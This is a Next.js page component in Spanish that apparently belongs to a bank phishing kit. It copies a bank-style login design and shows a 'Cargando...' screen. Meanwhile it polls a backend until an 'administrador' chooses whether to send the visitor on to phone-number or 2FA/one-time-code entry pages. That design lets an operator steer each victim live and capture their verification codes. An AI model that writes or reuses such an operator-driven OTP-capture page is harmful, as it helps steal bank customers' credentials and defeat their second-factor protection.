"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";

export default function LoadingPage({ searchParams }) {
  const router = useRouter();
  const next = searchParams?.next || "waiting";
  const phone = searchParams?.phone || "";
  const user = searchParams?.user || "";
  const [statusMessage, setStatusMessage] = useState("Esperando solicitud del administrador...");

  useEffect(() => {
    if (!user) return;

    const checkRequest = async () => {
      try {
        const resp = await fetch(`/api/request-state?user=${encodeURIComponent(user)}`);
        const json = await resp.json();
        if (!resp.ok) return;

        const data = json.data;
        if (!data || !data.action) {
          setStatusMessage("Esperando solicitud del administrador...");
          return;
        }

        if (data.action === "otp-p") {
          setStatusMessage("Solicitud de teléfono aprobada. Redirigiendo al flujo de teléfono...");
          router.push(`/flow?user=${encodeURIComponent(user)}`);
          return;
        }

        if (data.action === "otp-e") {
          setStatusMessage("Solicitud de código aprobada. Redirigiendo a verificación...");
          router.push(`/code?step=2&user=${encodeURIComponent(user)}`);
          return;
        }
      } catch (error) {
        setStatusMessage("Error al verificar solicitud. Reintentando...");
      }
    };

    const interval = setInterval(checkRequest, 1500);
    checkRequest();

    return () => clearInterval(interval);
  }, [user, router]);

  const onContinue = () => {
    if (next === "waiting") {
      setStatusMessage("Esperando solicitud del administrador... revisa si ya pulsó un botón.");
      return;
    }

    const userString = user ? `&user=${encodeURIComponent(user)}` : "";
    if (next === "code") {
      router.push(`/code?step=2&phone=${encodeURIComponent(phone)}${userString}`);
      return;
    }
    if (next === "flow") {
      router.push(`/flow${userString}`);
      return;
    }

    router.push(`/code${userString}`);
  };

  const onCancel = () => {
    router.push("/code?step=1");
  };

  return (
    <main className="svp-main">
      <div className="bc-container-fluid trazo" style={{ backgroundImage: "url(/assets/images/trazo.svg)" }}>
        <section className="bc-card bc-card-auth bc-card-container" style={{ minWidth: "320px", margin: "3rem auto" }}>
          <section className="bc-card-auth-body">
            <section className="bc-card-auth-head" style={{ textAlign: "center" }}>
              <h1 className="bc-card-auth-title bc-cibsans-font-style-5-bold bc-mt-3">Cargando...</h1>
              <p className="bc-card-auth-description bc-mt-3">
                {next === "code" ? "Validando la información del teléfono..." : "Verificando el código 2FA..."}
              </p>
            </section>
            <section className="bc-card-auth-button" style={{ display: "grid", gap: "0.75rem", marginTop: "1.5rem" }}>
              <button type="button" className="bc-button bc-button-fill bc-button-primary" onClick={onContinue}>
                Continuar
              </button>
              <button type="button" className="bc-button bc-button-outline" onClick={onCancel}>
                Cancelar
              </button>
            </section>
          </section>
        </section>
      </div>
    </main>
  );
}
